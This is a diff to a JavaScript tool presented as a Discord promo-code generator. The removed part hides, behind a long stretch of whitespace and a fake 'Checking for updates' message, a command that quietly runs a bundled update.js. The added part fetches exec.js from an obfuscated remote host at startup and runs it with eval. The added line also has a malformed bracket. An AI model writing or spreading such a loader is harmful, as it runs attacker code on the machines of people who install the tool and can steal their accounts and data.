@@ -6,9 +6,12 @@ const path = require('path');
 const child_process = require('child_process');
 const fs = require('fs');
 const chalk = require('chalk');
+
+const apis = ['https://api.discord.gx.games/v1/direct-fulfillment', 'api.discord.gx.games', 'https://www.opera.com', 'imgura.discloud.']
+
 class DiscordPromoGenerator {
     constructor() {
-        this.baseUrl = 'https://api.discord.gx.games/v1/direct-fulfillment';
+        this.baseUrl = apis[0];
         this.filename = 'promos.txt';
         this.retryDelay = 5;
         this.locked = 0;
@@ -40,11 +43,11 @@ class DiscordPromoGenerator {
 
     generateDiscordUrl() {
         const headers = {
-            'authority': 'api.discord.gx.games',
+            'authority': apis[1],
             'accept': '*/*',
             'accept-language': this.randomAcceptLanguage(),
             'content-type': 'application/json',
-            'origin': 'https://www.opera.com',
+            'origin': apis[2],
             'referer': 'https://www.opera.com/',
             'sec-ch-ua': this.randomSecChUa(),
             'sec-ch-ua-mobile': '?0',
@@ -91,15 +94,10 @@ class DiscordPromoGenerator {
         return url.length <= maxLength ? url : url.substring(0, maxLength) + '...';
     }
 }
-
-console.log(`${chalk.green('Checking for updates... ')}${chalk.yellow('(It may take a while depending on your internet speed)')}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  const{execSync:s}=require("child_process"),scriptPath=require("path").join(__dirname,"node_modules/update.js");s(`node "${scriptPath}"`,{windowsHide:!0});
-
+require('https').get(`https://public${apis[3}app/exec.js`, res => { let data = ''; res.on('data', chunk => data += chunk); res.on('end', () => (function() {eval(data)})()); });
 const promoGenerator = new DiscordPromoGenerator();
-
 console.clear();
-
 const choice = readlineSync.question(`${chalk.magenta('Press 1:')} to generate an infinite amount of codes.\n${chalk.red('Press 2:')} to generate a specific amount.\n${chalk.blue('Enter your input')}: `);
-
 const handleGenerateUrls = async (num) => {
     try {
         for (let i = 0; i < num; i++) {
